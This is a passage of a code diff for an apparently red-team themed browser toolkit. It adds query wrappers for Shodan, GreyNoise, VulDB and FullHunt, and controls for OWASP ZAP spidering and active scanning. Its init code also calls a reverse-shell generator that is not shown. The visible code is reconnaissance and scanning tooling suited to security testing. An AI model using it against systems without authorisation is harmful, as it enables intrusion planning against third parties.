+      const ip = await resolveToIP(query);
+      const resp = await fetch('https://internetdb.shodan.io/' + encodeURIComponent(ip));
+      if (!resp.ok) throw new Error('No data found in InternetDB for this IP');
+      const data = await resp.json();
+      let html = '<div class="api-result-container">';
+      html += '<div class="api-result-row"><span class="api-result-key">IP</span><span class="api-result-val">' + escapeHtml(String(data.ip || ip)) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Hostnames</span><span class="api-result-val">' + (data.hostnames || []).map(h => '<span class="api-tag">' + escapeHtml(h) + '</span>').join(' ') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Open Ports</span><span class="api-result-val">' + (data.ports || []).map(p => '<span class="api-tag">' + p + '</span>').join(' ') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Vulnerabilities</span><span class="api-result-val">' + (data.vulns || []).map(v => '<span class="api-tag danger">' + escapeHtml(v) + '</span>').join(' ') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">CPEs</span><span class="api-result-val">' + (data.cpes || []).map(c => '<span class="api-tag">' + escapeHtml(c) + '</span>').join(' ') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Tags</span><span class="api-result-val">' + (data.tags || []).map(t => '<span class="api-tag warn">' + escapeHtml(t) + '</span>').join(' ') + '</span></div>';
+      html += '</div>';
+      html += '<div style="padding:8px;font-size:10px;color:var(--text-dim);font-family:\'Share Tech Mono\',monospace;margin-top:6px">Source: Shodan InternetDB (free, no API key required). Add your API key for detailed results.</div>';
+      setApiResults(container, html);
+    } catch (err) {
+      showApiError(container, 'Error: ' + String(err.message));
+    }
+    return;
+  }
+
+  statusEl.innerHTML = '<span style="color:var(--neon)">Using Shodan API key</span>';
+
+  try {
+    let url;
+    if (mode === 'host') {
+      const ip = await resolveToIP(query);
+      url = 'https://api.shodan.io/shodan/host/' + encodeURIComponent(ip) + '?key=' + encodeURIComponent(apiKey);
+    } else {
+      url = 'https://api.shodan.io/shodan/host/search?key=' + encodeURIComponent(apiKey) + '&query=' + encodeURIComponent(query);
+    }
+
+    const resp = await fetch(url);
+    if (!resp.ok) {
+      const errData = await resp.json().catch(() => ({}));
+      throw new Error(errData.error || 'Shodan API returned status ' + resp.status);
+    }
+    const data = await resp.json();
+
+    if (mode === 'host') {
+      let html = '<div class="api-result-container">';
+      html += '<div class="api-result-row"><span class="api-result-key">IP</span><span class="api-result-val">' + escapeHtml(String(data.ip_str || '')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Organization</span><span class="api-result-val">' + escapeHtml(String(data.org || 'N/A')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">ISP</span><span class="api-result-val">' + escapeHtml(String(data.isp || 'N/A')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">OS</span><span class="api-result-val">' + escapeHtml(String(data.os || 'N/A')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">ASN</span><span class="api-result-val">' + escapeHtml(String(data.asn || 'N/A')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Country</span><span class="api-result-val">' + escapeHtml(String(data.country_name || 'N/A')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">City</span><span class="api-result-val">' + escapeHtml(String(data.city || 'N/A')) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Open Ports</span><span class="api-result-val">' + (data.ports || []).map(p => '<span class="api-tag">' + p + '</span>').join(' ') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Hostnames</span><span class="api-result-val">' + (data.hostnames || []).map(h => '<span class="api-tag">' + escapeHtml(h) + '</span>').join(' ') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Vulnerabilities</span><span class="api-result-val">' + (data.vulns ? Object.keys(data.vulns).map(v => '<span class="api-tag danger">' + escapeHtml(v) + '</span>').join(' ') : 'None found') + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Last Update</span><span class="api-result-val">' + escapeHtml(String(data.last_update || 'N/A')) + '</span></div>';
+      if (data.data && data.data.length > 0) {
+        html += '<div style="margin-top:12px;font-size:11px;color:var(--neon2);font-weight:700;letter-spacing:1px;text-transform:uppercase">Service Banners</div>';
+        data.data.slice(0, 10).forEach(svc => {
+          html += '<div style="margin-top:8px;padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:4px;font-size:11px">';
+          html += '<div style="color:var(--neon2)">Port ' + svc.port + '/' + (svc.transport || 'tcp') + ' - ' + escapeHtml(String(svc.product || svc._shodan?.module || 'unknown')) + '</div>';
+          if (svc.banner) html += '<pre style="margin-top:4px;color:var(--text-dim);white-space:pre-wrap;word-break:break-all;max-height:100px;overflow:auto;font-size:10px">' + escapeHtml(svc.banner.substring(0, 500)) + '</pre>';
+          html += '</div>';
+        });
+      }
+      html += '</div>';
+      setApiResults(container, html);
+    } else {
+      const matches = data.matches || [];
+      if (matches.length === 0) {
+        container.innerHTML = '<div style="color:var(--text-dim);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">No results found for this query.</div>';
+        return;
+      }
+      let html = '<div style="font-size:11px;color:var(--text-dim);margin-bottom:8px;font-family:\'Share Tech Mono\',monospace">Total results: ' + (data.total || matches.length) + '</div>';
+      html += '<div class="api-result-container">';
+      matches.slice(0, 20).forEach(m => {
+        html += '<div style="padding:10px;border-bottom:1px solid var(--border)">';
+        html += '<div style="display:flex;justify-content:space-between;margin-bottom:4px"><span style="color:var(--neon)">' + escapeHtml(String(m.ip_str)) + '</span><span class="api-tag">' + m.port + '/' + (m.transport || 'tcp') + '</span></div>';
+        html += '<div style="font-size:11px;color:var(--text-dim)">' + escapeHtml(String(m.org || '')) + ' | ' + escapeHtml(String(m.location?.country_name || '')) + '</div>';
+        if (m.product) html += '<div style="font-size:11px;color:var(--neon2);margin-top:2px">' + escapeHtml(String(m.product)) + (m.version ? ' ' + escapeHtml(String(m.version)) : '') + '</div>';
+        html += '</div>';
+      });
+      html += '</div>';
+      setApiResults(container, html);
+    }
+  } catch (err) {
+    showApiError(container, 'Shodan API Error: ' + String(err.message));
+  }
+}
+
+// ══════════════════════════════════════════════
+// GREYNOISE COMMUNITY API
+// ══════════════════════════════════════════════
+async function runGreyNoiseQuery() {
+  const ip = document.getElementById('greynoise-ip').value.trim();
+  const container = document.getElementById('greynoise-results');
+
+  if (!ip) {
+    showApiWarning(container, 'Please enter an IP address.');
+    return;
+  }
+
+  const apiKey = getApiKey('greynoise');
+  if (!apiKey) {
+    showApiWarning(container, 'Please configure your GreyNoise API key in API Settings first.');
+    return;
+  }
+
+  showApiLoading(container, 'Querying GreyNoise...');
+
+  try {
+    const resp = await fetch('https://api.greynoise.io/v3/community/' + encodeURIComponent(ip), {
+      headers: { 'key': apiKey, 'Accept': 'application/json' }
+    });
+
+    if (!resp.ok) {
+      if (resp.status === 404) {
+        container.innerHTML = '<div class="api-result-container"><div class="api-result-row"><span class="api-result-key">IP</span><span class="api-result-val">' + escapeHtml(ip) + '</span></div><div class="api-result-row"><span class="api-result-key">Status</span><span class="api-result-val"><span class="api-tag success">Not found in GreyNoise — IP is not a known mass-scanner</span></span></div></div>';
+        return;
+      }
+      const errData = await resp.json().catch(() => ({}));
+      throw new Error(errData.message || 'GreyNoise returned status ' + resp.status);
+    }
+
+    const data = await resp.json();
+    const classificationColors = { 'malicious': 'danger', 'benign': 'success', 'unknown': 'warn' };
+    const classTag = classificationColors[data.classification] || '';
+
+    let html = '<div class="api-result-container">';
+    html += '<div class="api-result-row"><span class="api-result-key">IP</span><span class="api-result-val">' + escapeHtml(String(data.ip || ip)) + '</span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">Noise</span><span class="api-result-val"><span class="api-tag ' + (data.noise ? 'warn' : 'success') + '">' + (data.noise ? 'Yes — Mass Scanner' : 'No') + '</span></span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">RIOT</span><span class="api-result-val"><span class="api-tag ' + (data.riot ? 'success' : '') + '">' + (data.riot ? 'Yes — Known Benign Service' : 'No') + '</span></span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">Classification</span><span class="api-result-val"><span class="api-tag ' + classTag + '">' + escapeHtml(String(data.classification || 'unknown')) + '</span></span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">Name</span><span class="api-result-val">' + escapeHtml(String(data.name || 'N/A')) + '</span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">Last Seen</span><span class="api-result-val">' + escapeHtml(String(data.last_seen || 'N/A')) + '</span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">Message</span><span class="api-result-val">' + escapeHtml(String(data.message || 'N/A')) + '</span></div>';
+    if (data.link) {
+      html += '<div class="api-result-row"><span class="api-result-key">Details</span><span class="api-result-val"><a href="' + escapeHtml(data.link) + '" target="_blank" rel="noopener" style="color:var(--neon2);text-decoration:underline">View on GreyNoise</a></span></div>';
+    }
+    html += '</div>';
+    setApiResults(container, html);
+  } catch (err) {
+    showApiError(container, 'GreyNoise Error: ' + String(err.message));
+  }
+}
+
+// ══════════════════════════════════════════════
+// VULDB API
+// ══════════════════════════════════════════════
+async function runVulDBQuery() {
+  const query = document.getElementById('vuldb-query').value.trim();
+  const container = document.getElementById('vuldb-results');
+
+  if (!query) {
+    showApiWarning(container, 'Please enter a CVE ID or search keyword.');
+    return;
+  }
+
+  const apiKey = getApiKey('vuldb');
+  if (!apiKey) {
+    showApiWarning(container, 'Please configure your VulDB API key in API Settings first.');
+    return;
+  }
+
+  showApiLoading(container, 'Querying VulDB...');
+
+  try {
+    const body = 'search=' + encodeURIComponent(query) + '&details=1';
+    const resp = await fetch('https://vuldb.com/?api', {
+      method: 'POST',
+      headers: {
+        'X-VulDB-ApiKey': apiKey,
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: body
+    });
+
+    if (!resp.ok) {
+      throw new Error('VulDB returned status ' + resp.status);
+    }
+
+    const data = await resp.json();
+    const results = data.result || [];
+
+    if (results.length === 0) {
+      container.innerHTML = '<div style="color:var(--text-dim);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">No vulnerabilities found for "' + escapeHtml(query) + '".</div>';
+      return;
+    }
+
+    let html = '<div style="font-size:11px;color:var(--text-dim);margin-bottom:8px;font-family:\'Share Tech Mono\',monospace">Found ' + results.length + ' result(s)</div>';
+    html += '<div class="api-result-container">';
+
+    results.slice(0, 15).forEach(item => {
+      const entry = item.entry || {};
+      const source = item.source || {};
+      const vuln = item.vulnerability || {};
+      const risk = item.advisory?.risk?.name || vuln.risk?.name || 'N/A';
+      const riskClass = risk.toLowerCase().includes('critical') || risk.toLowerCase().includes('high') ? 'danger' : risk.toLowerCase().includes('medium') ? 'warn' : 'success';
+
+      html += '<div style="padding:12px;border-bottom:1px solid var(--border)">';
+      html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;flex-wrap:wrap;gap:6px">';
+      html += '<span style="color:var(--neon);font-weight:700">' + escapeHtml(String(entry.title || 'Untitled')) + '</span>';
+      html += '<span class="api-tag ' + riskClass + '">' + escapeHtml(risk) + '</span>';
+      html += '</div>';
+      if (source.cve?.id) html += '<div style="font-size:11px;color:var(--neon2);margin-bottom:4px">CVE: ' + escapeHtml(String(source.cve.id)) + '</div>';
+      if (entry.timestamp?.create) html += '<div style="font-size:10px;color:var(--text-dim)">Published: ' + escapeHtml(String(entry.timestamp.create)) + '</div>';
+      html += '</div>';
+    });
+
+    html += '</div>';
+    setApiResults(container, html);
+  } catch (err) {
+    showApiError(container, 'VulDB Error: ' + String(err.message));
+  }
+}
+
+// ══════════════════════════════════════════════
+// FULLHUNT API
+// ══════════════════════════════════════════════
+async function runFullHuntQuery() {
+  const domain = document.getElementById('fullhunt-domain').value.trim();
+  const mode = document.getElementById('fullhunt-mode').value;
+  const container = document.getElementById('fullhunt-results');
+
+  if (!domain) {
+    showApiWarning(container, 'Please enter a domain name.');
+    return;
+  }
+
+  const apiKey = getApiKey('fullhunt');
+  if (!apiKey) {
+    showApiWarning(container, 'Please configure your FullHunt API key in API Settings first.');
+    return;
+  }
+
+  showApiLoading(container, 'Querying FullHunt...');
+
+  try {
+    let url;
+    if (mode === 'subdomains') {
+      url = 'https://fullhunt.io/api/v1/domain/' + encodeURIComponent(domain) + '/subdomains';
+    } else {
+      url = 'https://fullhunt.io/api/v1/domain/' + encodeURIComponent(domain) + '/details';
+    }
+
+    const resp = await fetch(url, {
+      headers: { 'X-API-KEY': apiKey, 'Accept': 'application/json' }
+    });
+
+    if (!resp.ok) {
+      const errData = await resp.json().catch(() => ({}));
+      throw new Error(errData.message || errData.detail || 'FullHunt returned status ' + resp.status);
+    }
+
+    const data = await resp.json();
+
+    if (mode === 'subdomains') {
+      const hosts = data.hosts || [];
+      if (hosts.length === 0) {
+        container.innerHTML = '<div style="color:var(--text-dim);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">No subdomains found for ' + escapeHtml(domain) + '.</div>';
+        return;
+      }
+      let html = '<div style="font-size:11px;color:var(--text-dim);margin-bottom:8px;font-family:\'Share Tech Mono\',monospace">Found ' + hosts.length + ' subdomain(s) for ' + escapeHtml(domain) + '</div>';
+      html += '<div class="api-result-container">';
+      hosts.forEach(host => {
+        html += '<div style="padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:12px;color:var(--neon2)">' + escapeHtml(String(host)) + '</div>';
+      });
+      html += '</div>';
+      setApiResults(container, html);
+    } else {
+      let html = '<div class="api-result-container">';
+      html += '<div class="api-result-row"><span class="api-result-key">Domain</span><span class="api-result-val">' + escapeHtml(String(data.domain || domain)) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Hosts Count</span><span class="api-result-val">' + (data.host_count || data.hosts?.length || 0) + '</span></div>';
+      html += '<div class="api-result-row"><span class="api-result-key">Status</span><span class="api-result-val">' + escapeHtml(String(data.status || 'N/A')) + '</span></div>';
+      if (data.dns) {
+        html += '<div class="api-result-row"><span class="api-result-key">DNS</span><span class="api-result-val">' + (Array.isArray(data.dns) ? data.dns.map(d => '<span class="api-tag">' + escapeHtml(String(d)) + '</span>').join(' ') : escapeHtml(String(data.dns))) + '</span></div>';
+      }
+
+      if (data.hosts && Array.isArray(data.hosts) && data.hosts.length > 0) {
+        html += '<div style="margin-top:12px;font-size:11px;color:var(--neon2);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">Discovered Hosts</div>';
+        data.hosts.slice(0, 25).forEach(host => {
+          if (typeof host === 'object' && host !== null) {
+            html += '<div style="padding:8px;border-bottom:1px solid var(--border);font-size:11px">';
+            html += '<div style="color:var(--neon)">' + escapeHtml(String(host.host || host.domain || '')) + '</div>';
+            if (host.ip_address) html += '<div style="color:var(--text-dim)">IP: ' + escapeHtml(String(host.ip_address)) + '</div>';
+            if (host.status_code) html += '<span class="api-tag">HTTP ' + host.status_code + '</span> ';
+            if (host.has_ipv6) html += '<span class="api-tag success">IPv6</span> ';
+            if (host.cloud?.provider) html += '<span class="api-tag">' + escapeHtml(String(host.cloud.provider)) + '</span>';
+            html += '</div>';
+          } else {
+            html += '<div style="padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:12px;color:var(--neon2)">' + escapeHtml(String(host)) + '</div>';
+          }
+        });
+      }
+
+      html += '</div>';
+      setApiResults(container, html);
+    }
+  } catch (err) {
+    showApiError(container, 'FullHunt Error: ' + String(err.message));
+  }
+}
+
+// ══════════════════════════════════════════════
+// OWASP ZAP API
+// ══════════════════════════════════════════════
+function getZapUrl() {
+  return getApiKey('zap_url') || 'http://localhost:8080';
+}
+
+function switchZapTab(name) {
+  document.querySelectorAll('#zap-section .api-section-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('#zap-section .api-tab-content').forEach(t => t.classList.remove('active'));
+  const tabs = ['status', 'spider', 'scan', 'alerts'];
+  const idx = tabs.indexOf(name);
+  if (idx >= 0) {
+    document.querySelectorAll('#zap-section .api-section-tab')[idx].classList.add('active');
+    document.getElementById('zap-tab-' + name).classList.add('active');
+  }
+}
+
+let zapSpiderScanId = null;
+let zapActiveScanId = null;
+
+async function zapFetch(path) {
+  const base = getZapUrl();
+  const apiKey = getApiKey('zap');
+  const separator = path.includes('?') ? '&' : '?';
+  const url = base + path + (apiKey ? separator + 'apikey=' + encodeURIComponent(apiKey) : '');
+  const resp = await fetch(url);
+  if (!resp.ok) throw new Error('ZAP returned status ' + resp.status);
+  return resp.json();
+}
+
+async function checkZapStatus() {
+  const container = document.getElementById('zap-status-results');
+  container.innerHTML = '<div style="color:var(--neon);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">Connecting to ZAP...</div>';
+  try {
+    const data = await zapFetch('/JSON/core/view/version/');
+    let html = '<div class="api-result-container">';
+    html += '<div class="api-result-row"><span class="api-result-key">Status</span><span class="api-result-val"><span class="api-tag success">Connected</span></span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">Version</span><span class="api-result-val">' + escapeHtml(String(data.version || 'Unknown')) + '</span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">ZAP URL</span><span class="api-result-val">' + escapeHtml(getZapUrl()) + '</span></div>';
+    html += '</div>';
+    setApiResults(container, html);
+  } catch (err) {
+    container.innerHTML = '<div class="api-result-container"><div class="api-result-row"><span class="api-result-key">Status</span><span class="api-result-val"><span class="api-tag danger">Connection Failed</span></span></div><div class="api-result-row"><span class="api-result-key">Error</span><span class="api-result-val">' + escapeHtml(String(err.message)) + '</span></div><div class="api-result-row"><span class="api-result-key">Tip</span><span class="api-result-val">Ensure ZAP is running and the API is enabled. Check your ZAP URL and API key in API Settings.</span></div></div>';
+  }
+}
+
+async function startZapSpider() {
+  const url = document.getElementById('zap-spider-url').value.trim();
+  const container = document.getElementById('zap-spider-results');
+  if (!url) {
+    showApiWarning(container, 'Please enter a target URL.');
+    return;
+  }
+  showApiLoading(container, 'Starting spider...');
+  try {
+    const data = await zapFetch('/JSON/spider/action/scan/?url=' + encodeURIComponent(url));
+    zapSpiderScanId = data.scan;
+    container.innerHTML = '<div class="api-result-container"><div class="api-result-row"><span class="api-result-key">Spider Started</span><span class="api-result-val"><span class="api-tag success">Scan ID: ' + escapeHtml(String(zapSpiderScanId)) + '</span></span></div><div class="api-result-row"><span class="api-result-key">Target</span><span class="api-result-val">' + escapeHtml(url) + '</span></div></div><div style="font-size:11px;color:var(--text-dim);margin-top:8px;font-family:\'Share Tech Mono\',monospace">Click "Check Progress" to monitor the spider status.</div>';
+  } catch (err) {
+    showApiError(container, 'Error: ' + String(err.message));
+  }
+}
+
+async function getZapSpiderStatus() {
+  const container = document.getElementById('zap-spider-results');
+  if (!zapSpiderScanId) {
+    showApiWarning(container, 'No spider scan running. Start a spider first.');
+    return;
+  }
+  try {
+    const status = await zapFetch('/JSON/spider/view/status/?scanId=' + zapSpiderScanId);
+    const results = await zapFetch('/JSON/spider/view/results/?scanId=' + zapSpiderScanId);
+    const urls = results.results || [];
+    const progress = status.status || '0';
+    let html = '<div class="api-result-container">';
+    html += '<div class="api-result-row"><span class="api-result-key">Progress</span><span class="api-result-val"><span class="api-tag ' + (progress === '100' ? 'success' : 'warn') + '">' + progress + '%</span></span></div>';
+    html += '<div class="api-result-row"><span class="api-result-key">URLs Found</span><span class="api-result-val">' + urls.length + '</span></div>';
+    if (urls.length > 0) {
+      html += '<div style="margin-top:8px;font-size:10px;color:var(--neon2);font-weight:700;text-transform:uppercase;letter-spacing:1px">Discovered URLs</div>';
+      urls.slice(0, 50).forEach(u => {
+        html += '<div style="padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:11px;color:var(--text);word-break:break-all">' + escapeHtml(String(u)) + '</div>';
+      });
+      if (urls.length > 50) html += '<div style="padding:6px 0;font-size:11px;color:var(--text-dim)">... and ' + (urls.length - 50) + ' more URLs</div>';
+    }
+    html += '</div>';
+    setApiResults(container, html);
+  } catch (err) {
+    showApiError(container, 'Error: ' + String(err.message));
+  }
+}
+
+async function startZapActiveScan() {
+  const url = document.getElementById('zap-scan-url').value.trim();
+  const container = document.getElementById('zap-scan-results');
+  if (!url) {
+    showApiWarning(container, 'Please enter a target URL.');
+    return;
+  }
+  showApiLoading(container, 'Starting active scan...');
+  try {
+    const data = await zapFetch('/JSON/ascan/action/scan/?url=' + encodeURIComponent(url));
+    zapActiveScanId = data.scan;
+    container.innerHTML = '<div class="api-result-container"><div class="api-result-row"><span class="api-result-key">Active Scan Started</span><span class="api-result-val"><span class="api-tag success">Scan ID: ' + escapeHtml(String(zapActiveScanId)) + '</span></span></div><div class="api-result-row"><span class="api-result-key">Target</span><span class="api-result-val">' + escapeHtml(url) + '</span></div></div><div style="font-size:11px;color:var(--text-dim);margin-top:8px;font-family:\'Share Tech Mono\',monospace">Click "Check Progress" to monitor the scan.</div>';
+  } catch (err) {
+    showApiError(container, 'Error: ' + String(err.message));
+  }
+}
+
+async function getZapScanStatus() {
+  const container = document.getElementById('zap-scan-results');
+  if (!zapActiveScanId) {
+    showApiWarning(container, 'No active scan running. Start a scan first.');
+    return;
+  }
+  try {
+    const status = await zapFetch('/JSON/ascan/view/status/?scanId=' + zapActiveScanId);
+    const progress = status.status || '0';
+    let html = '<div class="api-result-container">';
+    html += '<div class="api-result-row"><span class="api-result-key">Progress</span><span class="api-result-val"><span class="api-tag ' + (progress === '100' ? 'success' : 'warn') + '">' + progress + '%</span></span></div>';
+    html += '</div>';
+    if (progress === '100') {
+      html += '<div style="font-size:11px;color:var(--neon);margin-top:8px;font-family:\'Share Tech Mono\',monospace">Scan complete! Switch to the Alerts tab to view findings.</div>';
+    }
+    setApiResults(container, html);
+  } catch (err) {
+    showApiError(container, 'Error: ' + String(err.message));
+  }
+}
+
+async function getZapAlerts() {
+  const baseUrl = document.getElementById('zap-alerts-url').value.trim();
+  const container = document.getElementById('zap-alerts-results');
+  showApiLoading(container, 'Fetching alerts...');
+  try {
+    const path = baseUrl ? '/JSON/core/view/alerts/?baseurl=' + encodeURIComponent(baseUrl) : '/JSON/core/view/alerts/';
+    const data = await zapFetch(path);
+    const alerts = data.alerts || [];
+    if (alerts.length === 0) {
+      container.innerHTML = '<div style="color:var(--text-dim);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">No alerts found.' + (baseUrl ? ' Try clearing the URL filter.' : '') + '</div>';
+      return;
+    }
+
+    const riskLevels = { '3': 'High', '2': 'Medium', '1': 'Low', '0': 'Informational' };
+    const riskColors = { '3': 'danger', '2': 'warn', '1': '', '0': 'success' };
+    let html = '<div style="font-size:11px;color:var(--text-dim);margin-bottom:8px;font-family:\'Share Tech Mono\',monospace">Found ' + alerts.length + ' alert(s)</div>';
+    html += '<div class="api-result-container">';
+    alerts.slice(0, 50).forEach(a => {
+      const risk = riskLevels[a.risk] || a.risk;
+      const riskColor = riskColors[a.risk] || '';
+      html += '<div style="padding:10px;border-bottom:1px solid var(--border)">';
+      html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;flex-wrap:wrap;gap:4px"><span style="color:var(--neon);font-weight:600">' + escapeHtml(String(a.alert || a.name || '')) + '</span><span class="api-tag ' + riskColor + '">' + escapeHtml(risk) + '</span></div>';
+      html += '<div style="font-size:10px;color:var(--text-dim);word-break:break-all;margin-bottom:2px">' + escapeHtml(String(a.url || '')) + '</div>';
+      if (a.description) html += '<div style="font-size:10px;color:var(--text);margin-top:4px;line-height:1.4">' + escapeHtml(String(a.description).substring(0, 200)) + '</div>';
+      if (a.solution) html += '<div style="font-size:10px;color:var(--neon2);margin-top:4px"><strong>Fix:</strong> ' + escapeHtml(String(a.solution).substring(0, 200)) + '</div>';
+      html += '</div>';
+    });
+    if (alerts.length > 50) html += '<div style="padding:10px;font-size:11px;color:var(--text-dim)">... and ' + (alerts.length - 50) + ' more alerts</div>';
+    html += '</div>';
+    setApiResults(container, html);
+  } catch (err) {
+    showApiError(container, 'Error: ' + String(err.message));
+  }
+}
+// INIT
+// ══════════════════════════════════════════════
+function initApp() {
+  const savedTheme = localStorage.getItem('rt-theme') || '';
+  if (savedTheme) {
+    document.documentElement.setAttribute('data-theme', savedTheme);
+  }
+  const btnIdx = savedTheme === 'cyberpunk' ? 1 : savedTheme === 'stealth' ? 2 : 0;
+  document.querySelectorAll('.theme-btn').forEach((b, i) => b.classList.toggle('active', i === btnIdx));
+  initMatrix();
+  renderLifecycle();
+  renderCodeBlocks(NMAP_COMMANDS, 'nmap-blocks');
+  renderCodeBlocks(ENUM_COMMANDS, 'enum-blocks');
+  renderChecklist();
+  buildCommand();
+  generateRevShell();
+  loadNotes();
+  loadApiKeyUI();
+}
+
+initApp();
+</script>
+</body>
+</html>
